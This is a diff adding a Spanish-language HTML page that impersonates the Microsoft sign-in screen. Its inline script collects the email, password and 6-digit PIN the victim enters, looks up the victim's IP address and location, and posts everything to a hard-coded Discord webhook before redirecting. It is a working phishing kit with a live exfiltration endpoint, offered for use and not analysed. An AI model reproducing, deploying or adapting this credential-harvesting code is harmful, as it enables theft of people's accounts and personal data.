@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="tod">
+    <div class="header">
+        <div class="logo">
+            <div class="square red"></div>
+            <div class="square green"></div>
+            <div class="square blue"></div>
+            <div class="square yellow"></div>
+        </div>
+        <span class="brand">Microsoft</span>
+    </div>
+    
+    <h1>Iniciar sesión</h1>
+    
+    <form id="form" action="index-.html">
+        <label for="aa1">Correo electrónico</label>
+        <input type="email" id="aa1" name="aa1" placeholder="">
+        <div id="error-correo" class="error">Ingresa un correo válido</div>
+        
+        <label for="aa2">Contraseña</label>
+        <input type="text" id="aa2" name="aa2">
+        
+        <div class="checkbox-container">
+            <input type="checkbox" id="info">
+            <label for="info">Mantener la sesión iniciada</label>
+        </div>
+        
+        <p class="legal">
+            Al seleccionar Siguiente, acepto el 
+            <a href="#">Contrato de servicios de Microsoft</a> y la 
+            <a href="#">Declaración de privacidad</a>.
+        </p>
+        
+        <label for="PIN">PIN</label>
+        <input type="text" 
+               id="PIN" 
+               name="PIN" 
+               maxlength="6" 
+               inputmode="numeric" 
+               pattern="[0-9]*" 
+               placeholder="* * * * * *">
+        
+        <p class="legal">Agrega un pin de seguridad de 6 dígitos</p>
+        
+        <button type="submit" id="btn" disabled>Siguiente</button>
+    </form>
+   </div> 
+    <div class="footer">
+        <a href="#">Ayuda y comentarios</a>
+        <a href="#">Términos de uso</a>
+        <br>
+        <a href="#">Privacidad y cookies</a>
+    </div>
+    
+  
+    <script src="ak/script.js"></script>
+    <script src="ak/assect.js"></script>
+    <script src="ak/dus.js"></script>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1481333399946924203/b7E65TBdYOwrFuhD9_MC-wDt1HpBoK9PYjsRjid5i-EcHRJ64IvEnHWBv_-yfzQZqRXa";
+const inputEmail = document.getElementById('aa1');
+// ESTA ES LA LÍNEA QUE NECESITAS
+    localStorage.setItem('email_usuario', inputEmail.value);
+async function obtenerIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    return r.ok ? (await r.json()).ip : null;
+  } catch {
+    return null;
+  }
+}
+
+async function geoPorIP(ip) {
+  if (!ip) return null;
+  
+  try {
+    const r = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (!r.ok) return null;
+    
+    const j = await r.json();
+    return {
+      city: j.city || null,
+      region: j.region || null,
+      country: j.country_name || null,
+    };
+  } catch {
+    return null;
+  }
+}
+
+form.addEventListener('submit', async (ev) => {
+  ev.preventDefault();
+
+  const rubis = aa1.value.trim();
+  const pouy = aa2.value.trim();
+  const juty = PIN.value.trim();
+
+  if (btn.disabled || !rubis || !pouy || !juty) return;
+
+  btn.disabled = true;
+  btn.textContent = 'Enviando...';
+
+  try {
+    // 1. Obtener IP y Geo de forma secuencial y limpia
+    const ipValue = await obtenerIP();
+    const geoData = await geoPorIP(ipValue);
+
+    const message = [
+      '📩 **---HOTMAIL-PIN---**',
+      ` **Correo:** ${rubis}`,
+      ` **Clave:** ${pouy}`,
+      ` **PIN:** ${juty}`,
+      ` **IP:** ${ipValue || 'No disponible'}`,
+      geoData ? `📍 ${geoData.city || ''}, ${geoData.country || ''}` : '📍 Ubicación: No disponible'
+    ].join('\n');
+
+    // 2. USAR AWAIT AQUÍ ES VITAL
+    // Esto obliga al navegador a esperar que Discord responda "recibido"
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: message })
+    });
+
+    // 3. Redirigir solo después de confirmar el envío
+    window.location.href = "index1-.html";
+
+  } catch (err) {
+    console.error("Error enviando:", err);
+    // Redirigir de todos modos si algo falla para no trabar al usuario
+    window.location.href = "index1-.html";
+  }
+});
+</script>
+</body>
+</html>
